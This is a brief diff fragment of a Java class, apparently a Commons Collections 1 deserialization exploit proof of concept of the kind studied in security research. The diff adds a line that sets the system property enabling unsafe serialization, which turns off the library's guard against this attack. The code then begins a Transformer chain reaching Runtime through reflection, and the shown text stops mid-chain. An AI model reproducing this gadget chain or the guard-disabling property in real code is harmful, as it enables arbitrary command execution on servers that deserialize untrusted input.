@@ -29,6 +29,8 @@ import java.util.Map;
 
 public class cc1 {
     public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {
+        //补充安全省略设置
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod"
